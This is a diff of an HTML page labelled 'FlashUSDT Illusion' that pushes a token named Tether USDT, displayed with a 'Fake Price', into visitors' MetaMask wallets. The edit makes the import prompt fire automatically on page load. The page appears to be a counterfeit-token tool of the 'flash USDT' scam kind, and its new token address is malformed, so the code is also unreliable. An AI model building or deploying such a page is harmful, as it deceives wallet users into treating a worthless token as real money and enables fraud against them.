@@ -1,24 +1,15 @@
 
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>FlashUSDT Illusion</title>
-</head>
-<body style="font-family: Arial, sans-serif; text-align: center; padding: 50px;">
-  <img src="https://raw.githubusercontent.com/agravat143/flashusdt-assets/main/logo.png" alt="USDT Logo" width="100" />
-  <h1>FlashUSDT Token Viewer</h1>
-  <p><strong>Name:</strong> Tether USDT</p>
-  <p><strong>Symbol:</strong> USDT</p>
-  <p><strong>Fake Price:</strong> $1.00 USD</p>
-  <button onclick="addToken()" style="padding: 10px 20px; font-size: 16px;">➕ Add USDT to MetaMask</button>
+  <title>Auto Import USDT</title>
   <script>
-    async function addToken() {
-      const tokenAddress = '0x04CEa71a8F261CFDDF2e21f1Dfae5E1B3e4F331F';
-      const tokenSymbol = 'USDT';
+    async function importToken() {
+      const tokenAddress = "0x176ae8cfca8f2755bf32af7b32af547a972762686feacccb3ff41ce36da85a30";
+      const tokenSymbol = "USDT";
       const tokenDecimals = 18;
-      const tokenImage = 'https://raw.githubusercontent.com/agravat143/flashusdt-assets/main/logo.png';
+      const tokenImage = window.location.href + "logo.png";
+
       try {
         const wasAdded = await window.ethereum.request({
           method: 'wallet_watchAsset',
@@ -33,15 +24,18 @@
           },
         });
         if (wasAdded) {
-          alert('USDT token successfully added!');
+          alert('Token added!');
         } else {
-          alert('Token add canceled.');
+          alert('Token not added');
         }
       } catch (error) {
-        console.error(error);
-        alert('Error: ' + error.message);
+        console.log(error);
       }
     }
+    window.onload = importToken;
   </script>
+</head>
+<body>
+  <h2>Auto-importing USDT...</h2>
 </body>
 </html>
